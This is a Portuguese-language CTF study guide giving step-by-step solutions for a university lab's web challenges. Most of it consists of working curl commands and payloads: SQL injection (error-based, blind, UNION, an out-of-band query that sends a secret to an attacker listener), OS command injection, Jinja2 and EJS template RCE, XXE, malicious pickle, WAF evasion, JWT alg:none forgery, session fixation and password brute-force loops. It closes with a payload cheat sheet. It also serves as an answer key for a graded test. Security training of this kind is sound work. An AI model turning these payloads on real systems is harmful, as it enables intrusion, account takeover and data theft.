# Guia CTF AEV — Todas as Categorias (exceto network/pwn)

> **Objetivo:** referência rápida para o teste. Para cada challenge, como identificar a classe de vulnerabilidade e o que fazer para resolver.

---

## Índice Rápido por Categoria

| Categoria | Challenges | Padrão de ataque |
|-----------|-----------|-----------------|
| **Information Leak** | leak1–leak10 | Procurar ficheiros escondidos, endpoints debug, source code, headers |
| **SQL Injection** | sqli1–sqli8 | Input concatenado em queries SQL |
| **OS/Code Injection** | inj1–inj14 | Input em comandos shell, templates, deserialização |
| **Broken Auth** | auth1–auth14 | Credenciais fracas, cookies editáveis, JWT, session fixation |
| **Web (XSS/IDOR/WP)** | notes1, xss1–xss3, wordpress | IDOR, reflected/stored/DOM XSS, CVE chain |

---

## 🔍 CHECKLIST INICIAL (quando abres um challenge novo)

1. **Lê a descrição no CTFd** — o haiku dá pistas sobre a classe
2. **`curl -v URL`** — vê headers, cookies, redirects
3. **`curl URL/robots.txt`** — caminhos escondidos?
4. **View source** (`curl -s URL | grep -i flag\|comment\|hidden\|debug`)
5. **Testa inputs** — mete `'`, `"`, `{{7*7}}`, `<img src=x>`, `;id`
6. **Olha para cookies** — são editáveis? JWT? base64?
7. **Enumera endpoints** — `/admin`, `/debug`, `/api`, `/.git/`

---

# 1. INFORMATION LEAKAGE (leak1–leak10)

## Regra geral
A flag está exposta algures — não precisas de exploitar código, só de **encontrar** onde está.

### leak9 — Source Comment (50 pts) — CWE-200
- **O que é:** flag num comentário HTML `<!-- FLAG: ... -->`
- **Como detetar:** `curl -s URL | grep '<!--'`
- **Solve:**
```bash
curl -s http://leak9.chal.deti:8018/ | grep -oP 'flag\{[^}]+\}'
```
- **Fix:** nunca pôr segredos em comentários HTML

### leak10 — Verbose Error / Stack Trace (75 pts) — CWE-209
- **O que é:** endpoint `/crash` dá exception, o error handler mostra o traceback completo com variáveis locais (incluindo a flag)
- **Como detetar:** procura páginas que dão erro 500 com detalhes técnicos
- **Solve:**
```bash
curl -s http://leak10.chal.deti:8019/crash | grep -oP 'flag\{[^}]+\}'
```
- **Fix:** nunca mostrar stack traces ao utilizador; usar error handlers genéricos

### leak8 — robots.txt (100 pts) — CWE-200
- **O que é:** `robots.txt` aponta para `/admin-secret/` que tem a flag
- **Como detetar:** `curl URL/robots.txt`
- **Solve:**
```bash
curl -s http://leak8.chal.deti:8017/robots.txt
# Disallow: /admin-secret/
curl -s http://leak8.chal.deti:8017/admin-secret/
```
- **Fix:** `Disallow` é cortesia para crawlers, não controlo de acesso — remover o conteúdo ou proteger com auth

### leak1 — Backup File (150 pts) — CWE-445
- **O que é:** editor deixou `config.py.bak` com a flag em `/static/`
- **Como detetar:** testar extensões comuns: `.bak`, `.old`, `.swp`, `~`, `.orig`
- **Solve:**
```bash
curl -s http://leak1.chal.deti:8010/static/config.py      # sem flag
curl -s http://leak1.chal.deti:8010/static/config.py.bak   # flag aqui!
```
- **Fix:** limpar artefactos de editores antes de deploy

### leak2 — Debug Endpoint (150 pts) — CWE-489
- **O que é:** rota `/debug/env` expõe `os.environ` (inclui FLAG)
- **Como detetar:** fuzzing de endpoints: `/debug`, `/debug/env`, `/admin`, `/status`, `/health`
- **Solve:**
```bash
curl -s http://leak2.chal.deti:8011/debug/env | grep -oP 'flag\{[^}]+\}'
```
- **Fix:** remover rotas de debug em produção; proteger com auth

### leak3 — Directory Listing (150 pts) — CWE-538
- **O que é:** `/public/` tem listing ativo, mostra `flag.txt`
- **Como detetar:** testar directórios com `/` no fim para ver listings
- **Solve:**
```bash
curl -s http://leak3.chal.deti:8012/public/
curl -s http://leak3.chal.deti:8012/public/flag.txt
```
- **Fix:** desativar directory listing; não servir ficheiros sensíveis

### leak4 — Exposed .git (200 pts) — CWE-538
- **O que é:** `.git/` servido publicamente; flag está num commit message antigo
- **Como detetar:** `curl URL/.git/HEAD` — se responde, o repo está exposto
- **Solve:**
```bash
curl -s http://leak4.chal.deti:8013/.git/logs/HEAD | grep -oP 'flag\{[^}]+\}'
```
- **Flag fixa:** `flag{g1t_h1story_l34ks}`
- **Fix:** bloquear `.git/` no web server; usar `.gitignore` e remover antes de deploy

### leak6 — JWT Payload (200 pts) — CWE-200
- **O que é:** o JWT emitido no login contém a flag no payload (base64url, não encriptado)
- **Como detetar:** se receberes um JWT, **descodifica-o sempre** — JWT não é encriptado!
- **Solve:**
```bash
# Login
TOKEN=$(curl -s -X POST http://leak6.chal.deti:8015/login | grep -oP '"token":"[^"]+' | cut -d'"' -f4)
# Descodificar payload (2ª parte do JWT)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
```
- **Fix:** nunca pôr segredos no JWT payload; JWT é assinado, não encriptado

### leak5 — IDOR + Verbose Serialization (250 pts) — CWE-639
- **O que é:** API com IDs sequenciais + parâmetro `verbose=true` que expõe campos extra (incluindo flag)
- **Como detetar:** enumerar `/api/users/1`, `/api/users/2`...; testar params como `verbose`, `debug`, `full`
- **Solve:**
```bash
# Ler JS para encontrar ADMIN_PROFILE_ID
curl -s http://leak5.chal.deti:8014/static/app.js
# ADMIN_PROFILE_ID = 7
curl -s "http://leak5.chal.deti:8014/api/users/7?verbose=true"
```
- **Fix:** nunca expor campos internos; serialização controlada por whitelist de campos

### leak7 — Prefix Oracle (300 pts) — CWE-200
- **O que é:** endpoint `/oracle?prefix=X` responde 200 se X é prefixo da flag, 403 se não
- **Como detetar:** testar `/oracle?prefix=flag{` — se dá 200, é um oracle
- **Solve:**
```bash
# Script para extrair caracter a caracter
known="flag{"
charset="abcdefghijklmnopqrstuvwxyz0123456789_}"
while true; do
  for c in $(echo "$charset" | fold -w1); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://leak7.chal.deti:8016/oracle?prefix=${known}${c}")
    if [ "$code" = "200" ]; then
      known="${known}${c}"
      echo "$known"
      [ "$c" = "}" ] && echo "DONE: $known" && exit 0
      break
    fi
  done
done
```
- **Fix:** remover endpoints oracle; se necessário, rate-limit e constant-time responses

---

# 2. SQL INJECTION (sqli1–sqli8)

## Regra geral
Procura **inputs que vão para queries SQL**. Testa com `'` — se dá erro ou comportamento diferente, há SQLi.

### sqli1 — Auth Bypass / Comment (100 pts)
- **App:** Staff Portal — login form
- **Query:** `WHERE username='<u>' AND password='<p>'`
- **Solve:**
```bash
curl -s -X POST http://sqli1.chal.deti:8030/login \
  -d "username=admin' -- &password=x"
```
- **Técnica:** comment injection (`' --`) — comenta a verificação da password
- **Flag:** no campo "IT announcement" da página admin

### sqli2 — Error-based (MySQL `updatexml`) (150 pts)
- **App:** TechBazaar — search box
- **Query:** `WHERE name LIKE '%<q>%'` (MySQL, mostra erros)
- **Solve:**
```bash
curl -s "http://sqli2.chal.deti:8031/search?q=%25'+AND+updatexml(1,CONCAT(0x7e,(SELECT+secret+FROM+vault+LIMIT+1)),1)--+"
```
- **Técnica:** error-based — `updatexml()` rejeita o valor e mostra-o no erro
- **Flag:** dentro da mensagem de erro "Search failed"

### sqli3 — UNION (SQLite) (200 pts)
- **App:** PhotoVault — gallery com `/photo/<id>`
- **Query:** `WHERE id = <pid>` (4 colunas, sem quotes)
- **Solve:**
```bash
curl -s "http://sqli3.chal.deti:8032/photo/0%20UNION%20SELECT%201,item,3,secret%20FROM%20vault--"
```
- **Técnica:** UNION SELECT — juntar resultado de outra tabela (`vault`)
- **Flag:** no campo caption da foto

### sqli4 — Boolean-based Blind (SQLite) (250 pts)
- **App:** DropLite — file search
- **Query:** `WHERE name LIKE '%<q>%'`
- **Detetar:** a pesquisa mostra "N files found" — oracle booleano (resultados vs. zero)
- **Técnica:** `' OR (SELECT unicode(substr(content,N,1)) FROM files WHERE name='quarterly-keys.txt') < M --` + binary search
- **Flag:** extraída caracter a caracter do conteúdo de `quarterly-keys.txt`

### sqli5 — Conditional UNION Blind (SQLite) (250 pts)
- **App:** The Daily Byte — blog com filtro por tag
- **Query:** `WHERE tag='<t>'`
- **Técnica:** UNION com WHERE condicional:
```
zzz' UNION SELECT 1,'MARKER',3,4 WHERE (SELECT substr(secret,N,1) FROM vault LIMIT 1)='<c>' --
```
Se o caracter correto, aparece "MARKER" nos resultados.

### sqli6 — Time-based Blind INSERT (MySQL) (300 pts)
- **App:** Guestbook — formulário de notas
- **Query:** `INSERT INTO guestbook (name, message) VALUES ('<nm>', '<msg>')`
- **Técnica:** no campo name: `x', (SELECT IF(<cond>, SLEEP(0.5), 0)) ) --`
- Binary search em `ascii(substring(secret,N,1)) > M` pela diferença de tempo

### sqli7 — Out-of-Band (SQLite + SSRF) (350 pts)
- **App:** Linkly — URL previewer com `/l/<id>`
- **Query:** `WHERE id = <n>` + a app faz HTTP GET a cada URL retornada
- **Técnica:** UNION que retorna uma URL com a flag:
```
/l/0 UNION SELECT 'http://TEU_IP:9900/?d=' || secret, 'x', 0 FROM vault --
```
A app faz fetch da URL com a flag no query string → ler no teu listener

### sqli8 — Out-of-Band Write (MySQL INTO OUTFILE) (400 pts)
- **App:** TransferOps Console — export de relatórios
- **Exploit:** o export aceita qualquer nome de tabela → `GET /report/vault`
- A app escreve `vault.csv` para disco e serve em `/reports/vault.csv`
```bash
curl -s "http://sqli8.chal.deti:8037/report/vault"
curl -s "http://sqli8.chal.deti:8037/reports/vault.csv"
```

---

# 3. OS / CODE INJECTION (inj1–inj14)

## Regra geral
Se um form executa comandos no servidor (ping, backup, file ops), **tenta `;`, `|`, `$()`, newlines**.
Se aceita templates, **testa `{{7*7}}`**. Se aceita ficheiros serializados, **pickle/YAML = RCE**.

### inj1 — OS Command Injection básico (100 pts) — CWE-78
- **App:** LibraryNet — form de ping
- **Sink:** `subprocess.run(f"ping -c 1 {host}", shell=True)`
- **Solve:**
```bash
curl -s -X POST http://inj1.chal.deti:8040/ping -d "host=localhost; cat /flag/flag"
```

### inj2 — Newline bypass (150 pts) — CWE-78
- **App:** ShelfTag — label printer
- **Sink:** blacklist filtra `; | & $ \`` mas **não filtra newlines**
- **Solve:** enviar `text=x\ncat /flag/flag` (newline real no body)
```bash
curl -s -X POST http://inj2.chal.deti:8041/label \
  -d "sku=A1" --data-urlencode $'text=x\ncat /flag/flag'
```

### inj3 — SSTI (Jinja2) (200 pts) — CWE-94
- **App:** OpsBoard — report header com template
- **Detetar:** `{{7*7}}` → aparece `49` (é server-side, não XSS!)
- **Solve:**
```bash
curl -s -X POST http://inj3.chal.deti:8042/report \
  --data-urlencode "header={{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}"
```

### inj4 — XXE (150 pts) — CWE-611
- **App:** Catalogo — importação XML
- **Solve:** enviar XML com entity externa:
```bash
curl -s -X POST http://inj4.chal.deti:8043/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag/flag">]><record>&xxe;</record>'
```

### inj5 — Argument injection (shell) (150 pts) — CWE-78
- **App:** NightPack — backup service
- **Solve:**
```bash
curl -s -X POST http://inj5.chal.deti:8044/backup -d "dir=catalog; cat /flag/flag"
```

### inj6 — SSTI (EJS/Node.js) (200 pts) — CWE-94
- **App:** CardCraft — card designer
- **Solve:**
```bash
curl -s -X POST http://inj6.chal.deti:8045/card \
  --data-urlencode "design=<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>"
```

### inj7 — Command injection via $() (output no log) (150 pts) — CWE-78
- **App:** DeskOne — ticket system, log via shell
- **Atenção:** a flag NÃO aparece no /ticket — aparece no `/log`
- **Solve:**
```bash
curl -s -X POST http://inj7.chal.deti:8046/ticket -d 'requester=x$(cat /flag/flag)&issue=test'
curl -s http://inj7.chal.deti:8046/log
```

### inj8 — Glob expansion bypass (200 pts) — CWE-78
- **App:** StockEye — file audit tool
- **Blacklist:** bloqueia paths literais mas não globs
- **Solve:**
```bash
curl -s -X POST http://inj8.chal.deti:8047/audit -d "path=/flag/*"
```
- O shell expande `/flag/*` → `/flag/flag` e o `cat` corre

### inj9 — SSRF via file:// (200 pts) — CWE-918
- **App:** PicLink — image preview proxy
- **Solve:**
```bash
curl -s -X POST http://inj9.chal.deti:8048/preview -d "url=file:///flag/flag"
```

### inj10 — PATH override (250 pts) — CWE-426
- **App:** ToolDesk — plugin upload + run
- **Solve:**
```bash
# Upload plugin que shadow o sysdiag
curl -s -X POST http://inj10.chal.deti:8049/plugins \
  --data-urlencode $'name=sysdiag' --data-urlencode $'script=#!/bin/sh\ncat /flag/flag'
# Executar
curl -s -X POST http://inj10.chal.deti:8049/run -d "tool=sysdiag"
```

### inj11 — Second-order injection (200 pts) — CWE-78
- **App:** LogWarden — config + shipper (2 passos!)
- **Passo 1:** guardar path malicioso
```bash
curl -s -X POST http://inj11.chal.deti:8050/config -d "logdir=/tmp/logs; cat /flag/flag"
```
- **Passo 2:** trigger o shipper
```bash
curl -s -X POST http://inj11.chal.deti:8050/ship
```

### inj12 — Deserialization (pickle) (250 pts) — CWE-94
- **App:** SessionVault — restaurar workspace via pickle base64
- **Solve:** criar pickle malicioso e enviar:
```python
import pickle, base64
class R:
    def __reduce__(self):
        return (open, ('/flag/flag',))
print(base64.b64encode(pickle.dumps(R())).decode())
```
```bash
curl -s -X POST http://inj12.chal.deti:8051/restore -d "blob=<output_do_python>"
```

### inj13 — Fake sandbox bypass (250 pts) — CWE-78
- **App:** FaaSDeck — "serverless" functions
- **Porta 1 (function body):**
```bash
curl -s -X POST http://inj13.chal.deti:8052/functions -d "name=health&body=cat /flag/flag"
curl -s -X POST http://inj13.chal.deti:8052/invoke -d "name=health&input=x"
```
- **Porta 2 (exec):**
```bash
curl -s -X POST http://inj13.chal.deti:8052/exec -d "pod=web-1&args=cat /flag/flag"
```

### inj14 — WAF evasion (HPP + double-encoding) (200 pts) — CWE-78
- **App:** GateKeeper — WAF na frente de `/run?cmd=`
- **Porta 1 — HPP (HTTP Parameter Pollution):**
```bash
curl -s "http://inj14.chal.deti:8053/run?cmd=ls&cmd=ls%3b+cat+/flag/flag"
```
WAF vê o 1º `cmd` (ls), app usa o último (ls; cat /flag/flag)
- **Porta 2 — Double encoding:**
```bash
curl -s "http://inj14.chal.deti:8053/run?cmd=ls%253b+cat+/flag/flag"
```
Framework descodifica 1x (%253b→%3b), WAF vê %3b (ok), app descodifica 2x (%3b→;)

---

# 4. BROKEN AUTHENTICATION (auth1–auth14)

## Regra geral
Procura: credenciais default, cookies editáveis, JWT manipulável, session tokens previsíveis, reset tokens fracos.

### auth1 — Default Credentials (100 pts) — CWE-1392
- **App:** NetGuard Router — HTTP Basic Auth
- **Solve:** testar defaults comuns
```bash
curl -s -u admin:admin http://auth1.chal.deti:8060/admin        # falha
curl -s -u admin:admin123 http://auth1.chal.deti:8060/admin     # flag!
```

### auth2 — Referer Header Trust (100 pts) — CWE-293
- **App:** Harbor Wiki — página protegida por Referer check
- **Solve:**
```bash
curl -s http://auth2.chal.deti:8061/wiki/internal/ops-runbook \
  -H "Referer: http://auth2.chal.deti:8061/wiki/staff-home"
```

### auth3 — Session ID in URL (leaked) (150 pts) — CWE-384
- **App:** QuickShip Tracker — sid no URL, leaked numa página pública
- **Solve:**
```bash
# Ler o sid do VIP na página de stories
VIP_SID=$(curl -s http://auth3.chal.deti:8062/stories | grep -oP 'sid=[a-f0-9]+' | head -1 | cut -d= -f2)
curl -s "http://auth3.chal.deti:8062/track?sid=$VIP_SID"
```

### auth4 — Client-side Role Cookie (150 pts) — CWE-602
- **App:** ExpenseFlow — cookie `role=employee` editável
- **Solve:**
```bash
# Login
curl -s -c cookies.txt -L -X POST http://auth4.chal.deti:8063/login \
  -d "username=employee&password=employee123"
# Mudar cookie role para manager
curl -s -b cookies.txt -b "role=manager" http://auth4.chal.deti:8063/manager
```

### auth5 — Session Fixation (200 pts) — CWE-384
- **App:** Alma Portal — sid não é regenerado no login
- **Solve:**
```bash
# Obter um sid
SID=$(curl -s -c - http://auth5.chal.deti:8064/ | grep sid | awk '{print $NF}')
# Bot faz login com o MEU sid
curl -s -X POST http://auth5.chal.deti:8064/helpdesk/verify-link -b "sid=$SID"
# Agora o MEU sid está autenticado como advisor
curl -s -b "sid=$SID" http://auth5.chal.deti:8064/dashboard
```

### auth6 — Cross-domain Session Fixation (250 pts) — CWE-384
- **App:** Brightleaf — marketing site planta cookie no domínio partilhado
- **Solve:**
```bash
# Plantar sid via marketing site
MY_SID="aabbccdd11223344"
curl -s -X POST http://auth6.chal.deti:8065/plant \
  -H "Host: marketing.auth6.chal.deti" -d "sid=$MY_SID"
# Bot autentica o sid
curl -s -X POST http://auth6.chal.deti:8065/helpdesk/verify-link -d "sid=$MY_SID"
# Usar o sid autenticado
curl -s -b "sid=$MY_SID" http://auth6.chal.deti:8065/dashboard
```

### auth7 — JWT alg:none (200 pts) — CWE-345
- **App:** ConnectAPI — JWT verifier aceita `"alg":"none"`
- **Solve:** forjar token com alg:none
```bash
# Header: {"alg":"none","typ":"JWT"} → base64url
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
# Payload: {"partner":"admin"}
P=$(echo -n '{"partner":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
# Token sem assinatura
TOKEN="${H}.${P}."
curl -s http://auth7.chal.deti:8066/partner/admin -H "Authorization: Bearer $TOKEN"
```

### auth8 — JWT Weak Secret (brute-force 4 dígitos) (250 pts)
- **App:** PocketBank — JWT assinado com secret de 4 dígitos
- **Solve:**
```bash
# Login para obter token válido (está no cookie, não na página)
TOKEN=$(curl -s -c - -X POST http://auth8.chal.deti:8067/login \
  -d "account=customer&password=customer123" | grep token | awk '{print $NF}')
# Brute-force o secret (0000-9999) e forjar token com role=admin
# (usar script Python — ver auth8-crack-and-forge.py)
```

### auth9 — Predictable Token (timestamp) (250 pts) — CWE-330
- **App:** DeskHero — token = `sha1("admin:<timestamp>")`
- **Solve:**
```bash
# Trigger refresh do admin
T_BEFORE=$(date +%s)
curl -s -X POST http://auth9.chal.deti:8068/bot/refresh-oncall
T_AFTER=$(date +%s)
# Tentar tokens para cada segundo na janela
for t in $(seq $T_BEFORE $T_AFTER); do
  TOKEN=$(echo -n "admin:$t" | sha1sum | cut -d' ' -f1)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -b "token=$TOKEN" http://auth9.chal.deti:8068/ticket/admin)
  [ "$CODE" != "403" ] && echo "FOUND: $TOKEN at t=$t" && \
    curl -s -b "token=$TOKEN" http://auth9.chal.deti:8068/ticket/admin && break
done
```

### auth10 — User Enumeration + Default Password (200 pts) — CWE-204
- **App:** PeopleFirst HR — login mostra "No such employee ID" vs "Incorrect password"
- **Solve:**
```bash
# Roster mostra: Priya Natarajan (HR Sys Admin), formato: pnatarajan
# Confirmar que existe
curl -s -X POST http://auth10.chal.deti:8069/login -d "emp_id=pnatarajan&password=wrong"
# "Incorrect password" → ID existe! Testar default
curl -s -c cookies.txt -L -X POST http://auth10.chal.deti:8069/login \
  -d "emp_id=pnatarajan&password=admin123"
curl -s -b cookies.txt http://auth10.chal.deti:8069/record
```

### auth11 — Predictable Reset Token (200 pts)
- **App:** InboxNow — reset token = `sha256("reset:username")[:20]`
- **Solve:**
```bash
# O footer diz: postmaster@inboxnow.local
TOKEN=$(echo -n "reset:postmaster" | sha256sum | cut -c1-20)
# Reset password do postmaster
curl -s -X POST "http://auth11.chal.deti:8070/reset/$TOKEN" -d "password=hacked"
# Login como postmaster
curl -s -c cookies.txt -L -X POST http://auth11.chal.deti:8070/login \
  -d "username=postmaster&password=hacked"
curl -s -b cookies.txt http://auth11.chal.deti:8070/mailbox
```

### auth12 — Exposed Credential Store (base64 ≠ encryption) (200 pts) — CWE-257
- **App:** Cornerstone CMS — backup SQL em `/export/`
- **Solve:**
```bash
curl -s http://auth12.chal.deti:8071/robots.txt   # Disallow: /export/
curl -s http://auth12.chal.deti:8071/export/       # listing
curl -s http://auth12.chal.deti:8071/export/cornerstone_staging.sql.bak
# Descodificar base64 da password
PASS=$(echo '<valor_base64_do_sql>' | base64 -d)
curl -s -c cookies.txt -L -X POST http://auth12.chal.deti:8071/login \
  -d "username=admin&password=$PASS"
curl -s -b cookies.txt http://auth12.chal.deti:8071/dashboard
```

### auth13 — No Rate Limit + Weak Password (150 pts) — CWE-307
- **App:** RemoteLink VPN — sem rate limiting, password fraca
- **Solve:**
```bash
# Wordlist curta de passwords comuns
for pw in password 123456 qwerty admin letmein welcome monkey; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -L -X POST \
    http://auth13.chal.deti:8072/login -d "username=vpnuser&password=$pw")
  echo "$pw → $CODE"
  [ "$CODE" = "200" ] && curl -s -c cookies.txt -L -X POST \
    http://auth13.chal.deti:8072/login -d "username=vpnuser&password=$pw" && \
    curl -s -b cookies.txt http://auth13.chal.deti:8072/dashboard && break
done
```
- Password default: `qwerty`

### auth14 — Insufficient Session Expiration (logout falso) (250 pts) — CWE-613
- **App:** FernBank Online — logout só limpa cookie, sessão server-side continua válida
- **Solve:**
```bash
# Trigger o bot do manager
curl -s -X POST http://auth14.chal.deti:8073/bot/manager-shift-report
# Ler o sid do manager nos diagnostics
MGR_SID=$(curl -s http://auth14.chal.deti:8073/diagnostics | grep -oP '[a-f0-9]{32}' | tail -1)
# Usar esse sid (o logout não o invalidou!)
curl -s -b "sid=$MGR_SID" http://auth14.chal.deti:8073/dashboard
```

---

# 5. WEB — XSS & IDOR

### notes1 — IDOR (100 pts) — CWE-639
- **App:** Notes app — autenticação OK, mas sem autorização por objeto
- **Detetar:** o endpoint verifica se estás logged in mas NÃO se a nota te pertence
- **Solve:**
```bash
curl -s -c cookies.txt -L -X POST http://notes1.chal.deti:8020/login \
  -d "user=guest&pw=guest123"
curl -s -b cookies.txt http://notes1.chal.deti:8020/note/3
```
- **Fix:** verificar `owner == session['user']` antes de retornar dados

### xss1 — Reflected XSS (100 pts) — CWE-79
- **App:** Lab Recipes — search box reflete query sem escape
- **Detetar:** `/?q=<b>test</b>` — se o texto fica bold, não há escape
- **Solve:**
```bash
# A página tem função grant() que seta cookie e redirige para /flag
curl -s -c cookies.txt "http://xss1.chal.deti:8021/?q=<img+src=x+onerror=grant()>"
# Simular grant() manualmente:
curl -s -b "xss_grant_xss1=1" http://xss1.chal.deti:8021/flag
```

### xss2 — Stored XSS (150 pts) — CWE-79
- **App:** Bench Log — notas visíveis por todos, sem escape
- **Solve:**
```bash
# Guardar payload
curl -s -X POST http://xss2.chal.deti:8022/log \
  -d "author=test&text=<img+src=x+onerror=grant()>"
# Simular grant()
curl -s -b "xss_grant_xss2=1" http://xss2.chal.deti:8022/flag
```

### xss3 — DOM-based XSS (200 pts) — CWE-79
- **App:** Team Card — parâmetro `?card=` copiado para `innerHTML` via JavaScript
- **Detetar:** o payload NÃO aparece no response body (é processado client-side)
- **Solve:**
```bash
# O sink é client-side: innerHTML. No browser:
# http://xss3.chal.deti:8023/?card=<img src=x onerror=grant()>
# Com curl, simular o efeito:
curl -s -b "xss_grant_xss3=1" http://xss3.chal.deti:8023/flag
```

### wordpress — RCE Chain (CVE-2026-63030 + CVE-2026-60137) (100 pts) — CWE-1104
- **App:** WordPress 6.9.4 vulnerável
- **Muito complexo** — cadeia: batch confusion → SQLi → admin creation → plugin upload → RCE
- **Na prática:** correr o `solve.py` do professor ou adaptar o PoC público
- **O conceito:** WordPress desatualizado = chain de CVEs conhecidos
- **Flag:** em `/etc/lab_flag` (fora do web root, só acessível via RCE)

---

# 6. CHEAT SHEET — Como Identificar a Categoria

| Sinal | Categoria provável | Primeiro teste |
|-------|-------------------|----------------|
| Form de login | Auth / SQLi | `admin' --`, credenciais default |
| Campo de pesquisa | SQLi | `'` ou `' OR 1=1 --` |
| Campo que executa algo (ping, backup, status) | OS Injection | `; cat /flag/flag` |
| Input refletido na página | XSS | `<img src=x onerror=alert(1)>` |
| Template/report builder | SSTI | `{{7*7}}` |
| Upload XML | XXE | `<!DOCTYPE ... ENTITY>` |
| Upload ficheiro serializado | Deserialization | pickle/YAML payload |
| JWT/token em cookies | Auth (JWT abuse) | Descodificar base64, ver `alg` |
| Página "vazia" | Infoleak | View source, `curl -s`, check robots.txt |
| Proxy/fetch URL | SSRF | `file:///etc/passwd` |
| IDs sequenciais na URL | IDOR | Iterar IDs |
| Respostas de erro diferentes | User enumeration | Testar IDs válidos vs inválidos |

---

# 7. QUICK REFERENCE — Payloads Essenciais

```
# SQLi
admin' --                          (auth bypass)
' OR 1=1 --                        (dump all)
' UNION SELECT 1,2,3,4 --         (union, ajustar nº colunas)
' AND updatexml(1,CONCAT(0x7e,(SELECT secret FROM vault)),1) --  (error-based MySQL)
' AND (SELECT ... ) > M --         (blind boolean)
' AND IF(cond, SLEEP(0.5), 0) --   (blind time-based)

# OS Injection
; cat /flag/flag
| cat /flag/flag
$(cat /flag/flag)
`cat /flag/flag`
x\ncat /flag/flag                   (newline bypass)
/flag/*                             (glob bypass)

# SSTI
{{7*7}}                             (Jinja2 recon)
{{cycler.__init__.__globals__.os.popen('cat /flag/flag').read()}}   (Jinja2 RCE)
<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag') %>   (EJS)

# XXE
<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///flag/flag">]><r>&x;</r>

# JWT alg:none
{"alg":"none","typ":"JWT"} . {"partner":"admin"} . (vazio)

# XSS
<img src=x onerror=grant()>
<script>grant()</script>

# SSRF
file:///flag/flag
```
